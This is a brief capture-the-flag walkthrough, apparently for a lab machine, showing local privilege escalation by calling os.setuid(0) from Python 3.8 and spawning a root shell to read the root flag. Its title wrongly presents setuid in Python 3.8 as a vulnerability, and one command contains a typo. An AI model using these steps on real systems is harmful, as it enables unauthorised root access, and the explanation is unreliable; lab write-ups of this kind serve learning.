# Python 3.8 > setuid function is vulnerable

![image](https://github.com/user-attachments/assets/db0d2c42-daf2-453b-9d0d-82a38f96c482)

So by using os module in python to do root privileges in target

nathan@cap:~$ python3.8
>>  import os
>>  os.system('whoami')
>>  os.system('id')
>>  os.setuid(0)
>>  os.systme('bash')

root@cap: cat /root/root.txt
